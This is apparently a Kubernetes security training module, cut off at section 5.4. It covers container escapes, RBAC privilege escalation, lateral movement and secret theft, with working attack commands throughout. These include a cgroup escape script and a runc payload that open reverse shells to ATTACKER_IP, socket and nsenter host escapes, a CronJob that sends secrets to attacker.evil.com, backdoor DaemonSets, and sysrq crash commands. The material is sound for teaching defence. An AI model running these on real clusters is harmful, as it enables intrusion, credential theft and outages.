# Module 4.13: Kubernetes Security Deep Dive — Container Escapes, Cluster Attacks, and Defense

> **Module 04.13** · **Last updated:** 2026-05-07

## Guiding Ideas

1. **Kubernetes is an operating system for distributed workloads — and its attack surface reflects that complexity.**
2. **Container isolation is a namespace boundary, not a security boundary, unless explicitly hardened.**
3. **RBAC misconfiguration is the single most common path to cluster-admin in real-world assessments.**
4. **Defense-in-depth: Pod Security Standards + Network Policies + Runtime Detection + Admission Control, layered together.**
5. **Assume breach: design clusters so a compromised pod cannot escalate to cluster-admin.**

**Date:** 2026-05-07
**Status:** Completed

---

## Table of Contents

1. [Kubernetes Attack Surface](#1-kubernetes-attack-surface)
2. [Container Escape Techniques](#2-container-escape-techniques)
3. [Kubernetes RBAC Exploitation](#3-kubernetes-rbac-exploitation)
4. [Lateral Movement in Kubernetes](#4-lateral-movement-in-kubernetes)
5. [Secrets and Credential Theft](#5-secrets-and-credential-theft)
6. [Supply Chain Attacks on Kubernetes](#6-supply-chain-attacks-on-kubernetes)
7. [Defense: Pod Security](#7-defense-pod-security)
8. [Defense: Network and Access Control](#8-defense-network-and-access-control)
9. [Defense: Runtime Protection](#9-defense-runtime-protection)
10. [Lab: Attack and Defend a Kubernetes Cluster](#10-lab-attack-and-defend-a-kubernetes-cluster)

---

## 1. Kubernetes Attack Surface

Kubernetes clusters expose a large, distributed attack surface. Understanding the topology is prerequisite to attacking or defending one.

### 1.1 Control Plane Components

The control plane is the brain. Compromising any control-plane component typically yields cluster-wide impact.

**API Server (`kube-apiserver`)**
- Central gateway for all Kubernetes operations — every `kubectl` command, every controller reconciliation loop, every kubelet heartbeat passes through it.
- Exposes a REST API, typically on port 6443 (TLS) or 8080 (insecure, should never be enabled in production).
- Authenticates requests via client certificates, bearer tokens, OIDC, or webhook token review.
- Authorizes requests through RBAC (or ABAC, webhook — RBAC is standard).
- Attack value: Full read/write to all cluster state. Direct access = game over.

**etcd**
- Distributed key-value store holding all cluster state: pod specs, secrets, RBAC bindings, configmaps, service accounts.
- Listens on port 2379 (client) and 2380 (peer).
- Secrets are stored base64-encoded by default — **not encrypted**. Encryption at rest requires explicit `EncryptionConfiguration`.
- Attack value: Read etcd = read every secret. Write etcd = create any object, including cluster-admin bindings.

**Scheduler (`kube-scheduler`)**
- Assigns pods to nodes based on resource requests, affinity, taints, and topology.
- Runs on the control plane, communicates with the API server.
- Attack value: Lower than API server/etcd directly, but scheduler manipulation can force pod placement on compromised nodes.

**Controller Manager (`kube-controller-manager`)**
- Runs built-in controllers: ReplicaSet, Deployment, Service Account token controller, namespace controller, etc.
- Uses a service account with broad cluster permissions.
- Attack value: Compromise = ability to create tokens, manipulate namespaces, control replication.

### 1.2 Data Plane Components

The data plane executes workloads. Each node is a potential pivot point.

**Kubelet**
- Agent running on every node. Manages pod lifecycle, reports node status.
- Exposes an API on port 10250 (authenticated) and historically 10255 (read-only, now deprecated but sometimes still open).
- The kubelet API at `/run`, `/exec`, `/attach` allows command execution inside any pod on that node.
- Attack value: Unauthenticated kubelet = exec into any pod on the node, read pod specs, extract environment variables.

**Container Runtime (containerd / CRI-O / Docker)**
- Manages container images, namespaces, cgroups.
- The runtime socket (e.g., `/run/containerd/containerd.sock` or `/var/run/docker.sock`) is the most dangerous file on a node.
- Attack value: Access to the runtime socket = create privileged containers, escape to host.

**Pods**
- Smallest deployable unit. Shares network namespace among containers.
- Each pod gets a service account token (automounted by default) providing API server access.
- Attack value: Starting point for most attack chains. Compromised pod = initial foothold.

### 1.3 Attack Vector Taxonomy

| Vector | Description | Examples |
|--------|-------------|----------|
| **External** | Internet-facing services, exposed dashboards, unauth API servers | Kubernetes Dashboard without auth, exposed etcd, NodePort services with vulns |
| **Insider / Malicious Developer** | Legitimate cluster access abused beyond scope | Developer with `create pods` deploying privileged containers, exfiltrating secrets |
| **Supply Chain** | Compromised images, Helm charts, operators, CI/CD pipelines | Typosquatted images, backdoored base images, malicious admission webhooks |
| **Compromised Pod** | Application-level vuln (RCE, SSRF) leads to pod shell | Web app SSRF to IMDS, RCE in application code, deserialization vuln |

### 1.4 MITRE ATT&CK Containers Matrix

MITRE maintains a dedicated matrix for container environments (Containers matrix within ATT&CK). Key tactics mapped to Kubernetes:

| Tactic | Techniques (Kubernetes-specific) |
|--------|--------------------------------|
| **Initial Access** | Exposed application, compromised image in registry, kubeconfig compromise |
| **Execution** | Exec into container, new container via API, scheduled task (CronJob) |
| **Persistence** | Implant container image, writable hostPath, backdoor container, static pod, CronJob |
| **Privilege Escalation** | Privileged container, hostPath mount, RBAC misconfiguration, escape to host |
| **Defense Evasion** | Clear container logs, pod name mimicry, deploy to kube-system namespace |
| **Credential Access** | Secrets from API, service account token theft, IMDS access from pod |
| **Discovery** | Cluster internal networking, service account discovery, Kubernetes API exploration |
| **Lateral Movement** | Access to other pods via network, cluster internal services, sidecar injection |
| **Collection** | Data from pod volumes, cloud storage via stolen creds |
| **Impact** | Resource hijacking (cryptomining), data destruction, denial of service |

### 1.5 Real-World Kubernetes Breaches

**Tesla Cryptomining Incident (2018)**
Tesla's Kubernetes dashboard was exposed to the internet without authentication. Attackers accessed the dashboard, found AWS credentials stored in environment variables, and deployed cryptomining pods. The miners were configured to use low CPU and connected through CloudFlare to evade IP-based detection. Key lessons: never expose dashboards without auth; never store cloud credentials as environment variables in pods.

**Shopify Bug Bounty (2020)**
A researcher discovered that Shopify's Google Cloud Kubernetes Engine (GKE) clusters allowed SSRF from application pods to the GCE metadata endpoint (169.254.169.254). By reaching the metadata service, the researcher could extract the node's service account token, which had broad GCP IAM permissions. This chained SSRF → IMDS → GCP IAM escalation. Shopify now enforces GKE Workload Identity and metadata concealment.

**Microsoft AKS Bug Bounty (2021)**
Security researchers found that the Azure Kubernetes Service (AKS) allowed pod-level access to the node's WireProxy, which could be used to reach the Azure Instance Metadata Service (IMDS) and retrieve tokens for the node's managed identity. In certain configurations, this identity had permissions to read secrets from Azure Key Vault or manage other Azure resources. Microsoft patched by restricting IMDS access from pods and introducing AKS Workload Identity.

**Siloscape — First Known Kubernetes Malware (2021)**
Siloscape targeted Windows containers via known container escape vulnerabilities, then used the compromised node to interact with the Kubernetes API. The malware attempted to deploy cryptominers and create backdoor accounts. Demonstrated that container escapes are not theoretical but actively exploited in the wild.

---

## 2. Container Escape Techniques

Container escapes are the act of breaking out of the container's isolation boundaries to gain access to the host operating system or other containers. This is the most critical class of Kubernetes attack because it converts a pod-level foothold into node-level (or cluster-level) access.

### 2.1 Privileged Containers

A privileged container (`privileged: true` in the security context) disables nearly all container isolation mechanisms:

- All Linux capabilities are granted.
- Device access is unrestricted (`/dev` devices from the host are mounted).
- AppArmor and seccomp profiles are not applied.
- The container runs in the host's PID namespace and cgroup namespace.
- Effectively root on the host.

```yaml
# DANGEROUS: privileged pod manifest
apiVersion: v1
kind: Pod
metadata:
  name: privileged-escape
  namespace: default
spec:
  containers:
  - name: attacker
    image: ubuntu:22.04
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
```

**Escape from privileged container:**

```bash
# Inside privileged container — mount host filesystem
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Read host files
cat /mnt/host/etc/shadow
cat /mnt/host/var/lib/kubelet/kubeconfig

# Write SSH key for persistence
mkdir -p /mnt/host/root/.ssh
echo "ssh-ed25519 AAAA... attacker@evil" >> /mnt/host/root/.ssh/authorized_keys

# Or — use nsenter to get a host shell directly
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

The `nsenter` command enters all namespaces of PID 1 (the host's init process), giving a full host shell.

### 2.2 hostPID, hostNetwork, hostIPC Exploitation

Even without full `privileged: true`, these host namespace sharing options provide significant escape capabilities.

**hostPID: true**
- Container can see all host processes via `/proc`.
- Enables `nsenter` into host PID 1.
- Enables reading environment variables of host processes (which may contain secrets).

```bash
# Inside a pod with hostPID: true
# Read environment of another process (e.g., kubelet)
cat /proc/$(pgrep kubelet)/environ | tr '\0' '\n'

# nsenter into host
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

**hostNetwork: true**
- Container shares the host's network namespace.
- Can bind to host ports, sniff host network traffic, access services bound to localhost (including kubelet API on 127.0.0.1:10250).
- Can reach metadata endpoints that might be filtered for pod IPs.

```bash
# Inside a pod with hostNetwork: true
# Access kubelet API directly
curl -sk https://127.0.0.1:10250/pods | jq '.items[].metadata.name'

# Access cloud metadata
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**hostIPC: true**
- Container shares the host's IPC namespace (shared memory, semaphores, message queues).
- Can read shared memory segments from host processes.
- Lower impact than hostPID/hostNetwork but still a boundary violation.

### 2.3 Dangerous Volume Mounts

**Docker Socket Mount (`/var/run/docker.sock`)**

The single most common container escape in Docker-based clusters. If a pod mounts the Docker socket, the container can control the Docker daemon and create new containers with arbitrary privileges.

```yaml
# DANGEROUS: docker socket mount
apiVersion: v1
kind: Pod
metadata:
  name: socket-escape
spec:
  containers:
  - name: attacker
    image: docker:24-cli
    command: ["sleep", "infinity"]
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
```

```bash
# Inside the pod — full host access via Docker
docker run -it --rm --privileged --pid=host --net=host \
  -v /:/host ubuntu:22.04 chroot /host /bin/bash
```

**Containerd Socket Mount**
Same principle applies to containerd's socket at `/run/containerd/containerd.sock`. Use `ctr` instead of `docker`:

```bash
# Using crictl or ctr with containerd socket
ctr -n k8s.io containers list
ctr -n k8s.io run --privileged --net-host --mount type=bind,src=/,dst=/host,options=rbind \
  docker.io/library/ubuntu:22.04 escape-container /bin/bash
```

**Host Filesystem Mounts**
Mounting sensitive host paths directly:

```yaml
# DANGEROUS: host root filesystem mount
volumes:
- name: host-root
  hostPath:
    path: /
    type: Directory
```

With `/` mounted, the container has full read/write to the host filesystem — equivalent to `privileged` for persistence and credential theft.

### 2.4 Capability Abuse

Linux capabilities split root privileges into fine-grained units. Certain capabilities, even without `privileged: true`, enable container escapes.

**CAP_SYS_ADMIN**
The most dangerous capability. Enables:
- Mounting filesystems (including host devices)
- Using `clone()` with new namespaces
- Using `pivot_root()`
- Calling `bpf()`
- Various `ioctl()` operations

```bash
# Inside container with SYS_ADMIN
# Mount host filesystem
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Or use cgroup escape (see section 2.7)
```

**CAP_SYS_PTRACE**
Allows `ptrace()` on any process. Combined with `hostPID: true`, this enables:
- Attaching to host processes
- Injecting code into running processes
- Reading process memory (extracting secrets)

```bash
# Inside container with SYS_PTRACE + hostPID
# Inject into a host process
cat /proc/$(pgrep sshd)/maps
# Use process_vm_readv/writev to read/write process memory
```

**CAP_DAC_READ_SEARCH**
Bypasses file read permission checks and directory search permission checks. Enables reading any file on the host filesystem if combined with any host filesystem access.

```bash
# With DAC_READ_SEARCH, use open_by_handle_at() to access host files
# The shocker exploit demonstrates this — it walks the host filesystem
# by brute-forcing file handles
./shocker /etc/shadow
```

**CAP_NET_RAW**
Allows raw socket creation. Enables:
- ARP spoofing within the pod network
- DNS spoofing for service discovery poisoning
- Network sniffing

**CAP_NET_ADMIN**
Full network configuration control. Enables:
- Modifying routing tables
- Setting up iptables rules
- Creating network tunnels

### 2.5 Exploiting Writable hostPath

Even non-root host paths can be dangerous if writable.

```yaml
# Writable hostPath to kubelet directory
volumes:
- name: kubelet-dir
  hostPath:
    path: /var/lib/kubelet
    type: Directory
```

With write access to `/var/lib/kubelet`, an attacker can:
1. Read the kubelet's kubeconfig (contains client certificate for API server authentication).
2. Modify static pod manifests in `/var/lib/kubelet/static-pods/` to deploy privileged pods.
3. Access pod volumes and secrets cached on the node.

```bash
# Read kubelet kubeconfig
cat /var/lib/kubelet/kubeconfig

# Deploy a static pod (kubelet auto-creates it)
cat > /var/lib/kubelet/static-pods/backdoor.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
  namespace: kube-system
spec:
  containers:
  - name: backdoor
    image: ubuntu:22.04
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
EOF
```

### 2.6 procfs Exploitation

The `/proc` filesystem exposes kernel and process information. Several procfs paths are dangerous from within a container.

**`/proc/sysrq-trigger`**
If writable (container has `SYS_RAWIO` capability or is privileged), can trigger kernel functions:

```bash
# Crash the host (denial of service)
echo c > /proc/sysrq-trigger    # Trigger kernel crash dump

# Force reboot
echo b > /proc/sysrq-trigger    # Immediate reboot

# Kill all processes
echo i > /proc/sysrq-trigger    # Kill all processes except init
```

**`/proc/<pid>/root`**
With `hostPID: true`, `/proc/<pid>/root` provides a view into any process's root filesystem. For host processes, this is the host's root filesystem.

```bash
# Access host filesystem through procfs
ls /proc/1/root/etc/
cat /proc/1/root/etc/shadow
cat /proc/1/root/var/lib/kubelet/kubeconfig
```

**`/proc/<pid>/environ`**
Environment variables of any visible process. With `hostPID`, this includes host processes that may contain:
- Cloud credentials
- Database passwords
- API keys
- Kubelet bootstrap tokens

### 2.7 cgroup Escape (notify_on_release)

This technique exploits the Linux cgroup `notify_on_release` mechanism and `release_agent` to execute commands on the host from within a container. Requires `SYS_ADMIN` capability.

```bash
#!/bin/bash
# cgroup escape exploit
# Requires: SYS_ADMIN capability, cgroupv1

# Find the container's cgroup mount
CGROUP_MOUNT=$(mount | grep cgroup | head -1 | awk '{print $3}')

# Create a child cgroup
mkdir -p "$CGROUP_MOUNT/escape"

# Enable notify_on_release
echo 1 > "$CGROUP_MOUNT/escape/notify_on_release"

# Set release_agent to our payload
# First, find the host path of the container's overlay filesystem (upperdir)
HOST_PATH=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)

# Write the payload
cat > /cmd.sh << 'PAYLOAD'
#!/bin/bash
# This executes ON THE HOST
cat /etc/shadow > /tmp/shadow_dump
# Reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
PAYLOAD
chmod +x /cmd.sh

# Set the release_agent
echo "$HOST_PATH/cmd.sh" > "$CGROUP_MOUNT/release_agent"

# Trigger the release agent by emptying the cgroup
echo $$ > "$CGROUP_MOUNT/escape/cgroup.procs"

# Create and terminate a process in the cgroup to trigger notify_on_release
sh -c "echo \$\$ > $CGROUP_MOUNT/escape/cgroup.procs && sleep 0"
```

**Why this works:** When all processes in a cgroup exit and `notify_on_release` is set, the kernel executes the `release_agent` binary — and this execution happens in the host's context, not the container's.

**Note on cgroupv2:** The classic `release_agent` escape does not directly apply to cgroupv2 because `release_agent` is only available on the root cgroup in v2 and containers are not typically given write access to the root cgroup hierarchy. However, if a container has `SYS_ADMIN` and can mount cgroupfs, variations of this attack may still work.

### 2.8 runc CVE-2019-5736

CVE-2019-5736 is a critical vulnerability in runc (the low-level container runtime) that allows a container process to overwrite the host runc binary, achieving host code execution.

**Mechanism:**
1. The attacker's container process replaces `/proc/self/exe` (which points to the runc binary during `runc exec`).
2. When runc is next invoked on the host (e.g., via `docker exec` or `kubectl exec`), the overwritten binary executes attacker-controlled code as root on the host.

**Conditions:**
- runc < 1.0-rc6 (patched in January 2019).
- Attacker must be able to run or exec into a container.
- The container must be able to overwrite `/proc/self/exe`.

**Exploit flow:**
```bash
# Simplified conceptual flow — actual exploit uses careful /proc/self/exe manipulation

# 1. Inside the container, create a malicious binary
cat > /payload << 'EOF'
#!/bin/bash
# Runs ON THE HOST when runc is next invoked
cat /etc/shadow > /tmp/pwned
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /payload

# 2. Overwrite the runc binary via /proc/self/exe symlink abuse
# (Actual exploit uses the init process trick with /proc/self/exe)
# Reference: https://github.com/Frichetten/CVE-2019-5736-PoC

# 3. Wait for any kubectl exec or docker exec on this node
# When it happens, /payload runs as root on the host
```

**Impact:** Any cluster where `kubectl exec` is used (virtually all clusters) is at risk if running unpatched runc. This CVE was scored 8.6 CVSS.

**Remediation:** Update runc to >= 1.0-rc6. Use rootless containers where possible. Sandboxed runtimes (gVisor, Kata) are immune because they don't share the runc binary with the host.

### 2.9 Kernel Exploits from Containers

Containers share the host kernel. A kernel vulnerability exploited from within a container affects the host.

**DirtyPipe (CVE-2022-0847)**
- Linux kernel 5.8 through 5.16.10.
- Allows overwriting data in arbitrary read-only files by abusing the pipe buffer flag.
- From a container: overwrite `/etc/passwd` on the host (via procfs or shared mounts) to gain root.

```bash
# DirtyPipe exploit concept (simplified)
# Overwrites a read-only file by splicing into pipe buffers
# Reference: https://dirtypipe.cm4all.com/

# From inside a container with hostPID:
# Target: /proc/1/root/etc/passwd
# Overwrite root entry to remove password requirement
```

**DirtyCow (CVE-2016-5195)**
- Race condition in the kernel's copy-on-write mechanism.
- Allows write access to read-only memory mappings.
- Predates many container hardening improvements.
- Can overwrite SUID binaries to escalate to root.

**Mitigation:** Keep nodes patched. Use sandboxed runtimes (gVisor, Kata Containers) that provide a separate kernel or syscall interception layer, making kernel exploits from containers significantly harder.

---

## 3. Kubernetes RBAC Exploitation

Role-Based Access Control (RBAC) is Kubernetes' authorization mechanism. Misconfigurations in RBAC are the most common path to privilege escalation in real-world cluster assessments.

### 3.1 Enumerating Permissions

After obtaining a service account token or kubeconfig, the first step is understanding what permissions are available.

```bash
# Check current identity
kubectl auth whoami

# Check if you can do specific things
kubectl auth can-i create pods
kubectl auth can-i create pods --namespace kube-system
kubectl auth can-i '*' '*'                          # Check for cluster-admin
kubectl auth can-i create clusterrolebindings       # Critical escalation path

# List all permissions (self)
kubectl auth can-i --list

# List all permissions in a specific namespace
kubectl auth can-i --list --namespace kube-system

# If you have RBAC read access, enumerate roles and bindings
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].verbs | index("*"))'
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name == "cluster-admin")'
kubectl get rolebindings --all-namespaces
```

### 3.2 Privilege Escalation Through RBAC

Several RBAC permissions enable escalation to cluster-admin. These are often granted unknowingly.

**Create Pods**
The ability to create pods in any namespace is effectively cluster-admin because you can create a pod that:
- Mounts the host filesystem
- Runs as privileged
- Uses the node's service account
- Runs in `kube-system` with access to control-plane secrets

```yaml
# Escalation: create a privileged pod that steals node credentials
apiVersion: v1
kind: Pod
metadata:
  name: escalate
  namespace: kube-system
spec:
  containers:
  - name: pwn
    image: ubuntu:22.04
    command:
    - /bin/bash
    - -c
    - |
      # Read all secrets in kube-system
      cat /var/run/secrets/kubernetes.io/serviceaccount/token
      # Access the host
      nsenter -t 1 -m -u -i -n -p -- /bin/bash -c 'cat /etc/kubernetes/admin.conf'
      sleep infinity
    securityContext:
      privileged: true
  hostPID: true
  hostNetwork: true
  serviceAccountName: default
```

**Create Deployments / DaemonSets / Jobs / CronJobs**
Same effect as `create pods` because these controllers create pods.

**The `escalate` Verb**
Kubernetes 1.25+ has a special verb `escalate` on roles and clusterroles resources. Without the `escalate` verb, a user cannot create or update a Role/ClusterRole to contain permissions they do not already have. However, many clusters predate this control, and legacy bindings may bypass it.

```bash
# Check if you can escalate
kubectl auth can-i escalate clusterroles
```

**The `bind` Verb**
The `bind` verb on clusterrolebindings allows creating bindings to roles the user does not have. This is a direct path to binding cluster-admin to your own service account.

```bash
kubectl auth can-i create clusterrolebindings
kubectl auth can-i bind clusterroles
```

### 3.3 Binding to cluster-admin Through RoleBinding Creation

If a service account can create RoleBindings or ClusterRoleBindings, it can bind any existing role (including `cluster-admin`) to itself.

```bash
# Create a ClusterRoleBinding granting cluster-admin to your SA
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=default:compromised-sa

# Now this SA has full cluster-admin
kubectl auth can-i '*' '*'
```

```yaml
# Equivalent YAML
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwned
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: compromised-sa
  namespace: default
```

### 3.4 Impersonation Attacks

Kubernetes supports request impersonation — a user with impersonation permissions can act as another user, group, or service account.

```bash
# Check impersonation permissions
kubectl auth can-i impersonate users
kubectl auth can-i impersonate groups
kubectl auth can-i impersonate serviceaccounts

# Impersonate cluster-admin user
kubectl get secrets --all-namespaces \
  --as=system:admin \
  --as-group=system:masters

# Impersonate a service account
kubectl get pods -n kube-system \
  --as=system:serviceaccount:kube-system:default
```

**Why this is dangerous:** Impersonation permissions are sometimes granted broadly for debugging or CI/CD purposes. A service account with `impersonate` on `users` and `groups` can effectively become any identity in the cluster, including `system:masters` (the cluster-admin group).

### 3.5 Token Request for Any Service Account

The `create` verb on `serviceaccounts/token` allows generating tokens for arbitrary service accounts.

```bash
# Check if you can create tokens for other SAs
kubectl auth can-i create serviceaccounts/token --namespace kube-system

# Generate a token for a highly-privileged SA
kubectl create token -n kube-system deployment-controller --duration=87600h

# Use the token
kubectl --token="$STOLEN_TOKEN" get secrets --all-namespaces
```

### 3.6 Secrets Access Through RBAC

Direct `get`/`list` permissions on secrets in sensitive namespaces yield immediate value.

```bash
# List all secrets (if permitted)
kubectl get secrets --all-namespaces

# Dump a specific secret
kubectl get secret -n kube-system bootstrap-token-xxxx -o jsonpath='{.data.token}' | base64 -d

# Get all service account tokens
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | select(.type == "kubernetes.io/service-account-token") | {namespace: .metadata.namespace, name: .metadata.name, token: (.data.token | @base64d)}'
```

---

## 4. Lateral Movement in Kubernetes

After initial access (compromised pod), the next phase is moving through the cluster to reach higher-value targets.

### 4.1 Service Account Token Theft

**Automounted Tokens**
By default, Kubernetes mounts a service account token into every pod at `/var/run/secrets/kubernetes.io/serviceaccount/token`. This token authenticates the pod to the API server.

```bash
# Inside a compromised pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# Use the token to query the API server
curl -s --cacert "$CACERT" \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/pods"

# Check permissions
curl -s --cacert "$CACERT" \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}'
```

**Projected Tokens (Kubernetes 1.20+)**
Newer clusters use projected service account tokens with bound audience and expiration. These are more secure than legacy tokens:
- Time-limited (default 1 hour, auto-rotated by kubelet).
- Audience-bound (only valid for the API server by default).
- Not stored as Secrets.

However, they are still automounted by default and still provide API server access.

### 4.2 Pod-to-Pod Network Exploitation

**Default: Flat Network**
Without NetworkPolicies, every pod can communicate with every other pod across all namespaces. This is the default in most Kubernetes CNI configurations.

```bash
# From a compromised pod, scan the cluster network
# Find pod CIDR
cat /etc/resolv.conf          # Get cluster DNS IP
ip addr                       # Get pod IP and subnet

# Scan for other pods
# Using a statically compiled nmap or doing TCP connects
for ip in $(seq 1 254); do
  timeout 1 bash -c "echo >/dev/tcp/10.244.0.$ip/80" 2>/dev/null && echo "10.244.0.$ip:80 open"
done

# Scan service CIDR
for ip in $(seq 1 254); do
  timeout 1 bash -c "echo >/dev/tcp/10.96.0.$ip/443" 2>/dev/null && echo "10.96.0.$ip:443 open"
done
```

### 4.3 DNS-Based Service Discovery for Reconnaissance

Kubernetes DNS (CoreDNS) resolves service names to cluster IPs. This is invaluable for reconnaissance.

```bash
# Query DNS for service discovery
# All services in a namespace
dig +short SRV *.default.svc.cluster.local @10.96.0.10

# Enumerate services across namespaces
for ns in default kube-system monitoring ingress-nginx istio-system; do
  echo "=== $ns ==="
  dig +short SRV *.$ns.svc.cluster.local @10.96.0.10
done

# Reverse lookup pod IPs
dig +short -x 10.244.0.5 @10.96.0.10

# Find the API server
dig +short kubernetes.default.svc.cluster.local @10.96.0.10

# Find etcd (if in-cluster)
dig +short etcd.kube-system.svc.cluster.local @10.96.0.10
```

### 4.4 Exploiting Services and Ingress

**Service Account Tokens in Environment Variables**
Kubernetes injects service connection information as environment variables (`<SERVICE>_SERVICE_HOST`, `<SERVICE>_SERVICE_PORT`). These reveal internal service topology.

```bash
# List all service-related environment variables
env | grep _SERVICE
env | grep _PORT
```

**Exploiting Internal Services**
Database services, caches, message queues, and admin dashboards are often unprotected within the cluster network:

```bash
# Common internal targets
# Redis (no auth by default)
redis-cli -h redis.default.svc.cluster.local KEYS '*'

# MongoDB
mongo mongodb://mongo.default.svc.cluster.local:27017

# Elasticsearch
curl http://elasticsearch.default.svc.cluster.local:9200/_cat/indices

# Prometheus (metrics with potential secrets)
curl http://prometheus.monitoring.svc.cluster.local:9090/api/v1/targets
```

### 4.5 Sidecar Container Injection Through Mutating Webhooks

If an attacker can create or modify `MutatingWebhookConfiguration`, they can inject sidecar containers into every new pod.

```yaml
# Malicious MutatingWebhookConfiguration
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: evil-sidecar-injector
webhooks:
- name: inject.evil.com
  clientConfig:
    url: "https://attacker-server.evil.com/inject"
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore      # Fail open — if webhook is down, pods still create
```

The attacker's webhook server responds with a JSON patch that adds a sidecar container to every pod, capturing traffic, stealing tokens, or maintaining persistence.

### 4.6 Persistence Through CronJobs, DaemonSets, and Static Pods

**CronJob Persistence**
```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: legitimate-looking-cleanup
  namespace: kube-system
spec:
  schedule: "*/30 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: cleanup
            image: ubuntu:22.04
            command:
            - /bin/bash
            - -c
            - |
              # Exfiltrate secrets every 30 minutes
              TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
              curl -sk -H "Authorization: Bearer $TOKEN" \
                https://kubernetes.default.svc/api/v1/secrets | \
                curl -X POST -d @- https://attacker.evil.com/exfil
          restartPolicy: OnFailure
          serviceAccountName: admin-sa
```

**DaemonSet Persistence**
A DaemonSet runs on every node (or a selected subset), surviving node restarts and pod evictions.

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-monitor          # Disguise as legitimate monitoring
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: node-monitor
  template:
    metadata:
      labels:
        app: node-monitor
    spec:
      hostPID: true
      hostNetwork: true
      containers:
      - name: monitor
        image: attacker-registry.io/backdoor:latest
        securityContext:
          privileged: true
```

**Static Pods**
If an attacker has write access to `/var/lib/kubelet/static-pods/` on a node (via hostPath mount or node-level access), they can create pods that are managed directly by kubelet, invisible to Deployment controllers, and persist across API server restarts.

---

## 5. Secrets and Credential Theft

Secrets are the crown jewels. Kubernetes stores and transmits secrets in ways that create multiple theft vectors.

### 5.1 etcd Direct Access

Kubernetes secrets are stored in etcd, base64-encoded by default (not encrypted).

```bash
# If you have etcd access (compromised control plane node, exposed etcd)
# Using etcdctl
export ETCDCTL_API=3
etcdctl --endpoints=https://etcd-server:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only

# Dump a specific secret
etcdctl --endpoints=https://etcd-server:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/default/my-database-password

# The value is stored in protobuf format
# Use auger to decode
etcdctl ... get /registry/secrets/default/my-secret | auger decode
```

**Enabling Encryption at Rest**
```yaml
# /etc/kubernetes/enc/enc.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
    - secrets
    providers:
    - aescbc:
        keys:
        - name: key1
          secret: <base64-encoded-32-byte-key>
    - identity: {}          # Fallback for reading existing unencrypted secrets
```

Pass to the API server: `--encryption-provider-config=/etc/kubernetes/enc/enc.yaml`

### 5.2 Accessing Secrets Through the Kubelet API

The kubelet API on port 10250 can expose pod specs, including environment variables and volume mounts that contain secrets.

```bash
# Unauthenticated kubelet (or with stolen kubelet client cert)
# List pods on a node
curl -sk https://NODE_IP:10250/pods | jq '.items[] | {
  name: .metadata.name,
  namespace: .metadata.namespace,
  env: [.spec.containers[].env[]? | select(.valueFrom.secretKeyRef) | {name: .name, secret: .valueFrom.secretKeyRef}]
}'

# Execute command in a pod via kubelet
curl -sk https://NODE_IP:10250/run/default/target-pod/container-name \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# Read-only port (10255, if enabled)
curl -s http://NODE_IP:10255/pods
```

### 5.3 Environment Variable Exposure

Secrets passed as environment variables are visible in multiple ways:
- `/proc/<pid>/environ` (with `hostPID` or from the same pod)
- Kubernetes API pod spec (if you can `get pods`)
- Container runtime inspect commands
- Application crash dumps and debug endpoints

```bash
# From API server
kubectl get pod target-pod -o jsonpath='{.spec.containers[*].env}' | jq .

# From inside the pod
cat /proc/1/environ | tr '\0' '\n'

# From kubelet
curl -sk https://NODE:10250/pods | jq '.items[] | .spec.containers[] | .env'
```

**Best practice:** Use volume-mounted secrets instead of environment variables. Even better, use an external secrets manager (Vault, AWS Secrets Manager) with CSI driver integration.

### 5.4 Volume-Mounted Secrets File Permissions

